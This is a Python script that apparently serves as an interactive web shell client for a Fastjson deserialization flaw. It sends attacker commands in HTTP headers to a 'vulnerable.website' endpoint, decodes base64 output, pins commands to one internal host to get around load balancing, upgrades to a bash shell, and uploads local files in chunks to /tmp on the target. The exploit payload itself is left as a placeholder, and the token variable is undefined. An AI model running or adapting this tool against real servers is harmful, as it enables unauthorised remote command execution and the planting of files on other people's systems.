#!/usr/bin/python3

import base64
from cgi import print_environ
from email.mime import base
import random
import re
from commonmark import ReStructuredTextRenderer
import requests
import threading
import hashlib
import tqdm
import time
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
class WebShell(object):
    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3):
        # MODIFY THIS, URL
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval
        
    # Execute Command.
    def RunRawCmd(self, cmd, upload=False, timeout=50):
        proxies = {
            "http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
        }
        
        url = "https://vulnerable.website/queryConditionListByPage"

        # Convert command result to base64
        if upload == False:
            cmd = cmd + "| base64"
        else:
            cmd = cmd

        # Headers
        headers = {
            "Authorization":token,
            "cmd":cmd,
        }

        #Payload
        payload = r"""Put your fastjson payload here"""

        try:
            r = requests.post(url=url, headers=headers, data=payload, timeout=10 ,verify=False)
        except:
            pass
        else:
            if "token已失效!" in r.text:
                print("[-] token已失效!")
            elif "uploaded" in r.text:
                return "Done"
            else:
                try:
                    return(base64.b64decode(r.text).decode('utf-8'))
                except:
                    pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell)

    def bypass_LoadBalancing(self, cmd, normal=True):
        #ip=$(ifconfig eth0 | grep netmask | awk '{print $2}') && if [ $ip == "172.29.121.29" ]; then echo "hello";fi
        #172.29.121.27
        cmd_LB = r"""ip=$(ifconfig eth0 | grep netmask | awk '{print $2}') && if [ $ip == "172.29.121.29" ]; then """ + cmd + r" || echo && echo [+] Bypass load balancing ;fi"

        cmd_LB2 = r"""ip=$(ifconfig eth0 | grep netmask | awk '{print $2}') && if [ $ip == "172.29.121.29" ]; then """ + cmd + r" && echo uploaded ;fi"
        while True:
            if normal == True:
                result = self.RunRawCmd(cmd=cmd_LB)
                if result != None:
                    print(result)
                    break
            else:
                result = self.RunRawCmd(cmd=cmd_LB2, upload=True)
                if result == "Done":
                    break
    
    def upload(self,local_file):
        remote_path="/tmp/"
        remote_file_b64 = remote_path + local_file+".b64"
        remote_file = remote_path + local_file
        print("Uploading "+local_file+" to "+remote_path)
        cmd = f"touch {remote_file_b64}"
        self.bypass_LoadBalancing(cmd)
        print("[+] File created under avoid LB")
        
        with open(local_file, 'rb') as f:
            data = f.read()
            #md5sum = hashlib.md5(data).hexdigest()
            """
            string = "StackOverflow"
            output = base64.urlsafe_b64encode(hashlib.sha256(string.encode("utf-8")).hexdigest().encode("utf-8"))
            print(str(output))
            """
            #b64enc_data = b"".join(base64.urlsafe_b64encode(hashlib.sha256(data.encode("utf-8")).hexdigest().encode("utf-8")))
            #b64enc_data = b"".join(base64.urlsafe_b64encode(data).split()).decode()
            b64enc_data = b"".join(base64.b64encode(data).split()).decode()
            #print(b64enc_data)
        
        print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
        BUFFER_SIZE = 5*1024
        for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
            cmd = 'echo -n "'+ b64enc_data[i:i+BUFFER_SIZE]+'" >> ' + remote_file_b64
            #status = self.RunRawCmd(cmd, upload=True)
            #print(status)
            self.bypass_LoadBalancing(cmd,normal=False)
            print("[+] File Uploading with avoid load balancing")

        cmd = f"cat {remote_file_b64} | base64 -d > {remote_file}"
        self.bypass_LoadBalancing(cmd)
        print("[+] Upload finished")
        
prompt = "Fastjson> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    elif cmd == "upload":
        local_file = input("[+] local file: ")
        S.upload(local_file)
    else:
        if cmd == '':
            print("[-] Error input")
        else:
            S.bypass_LoadBalancing(cmd)
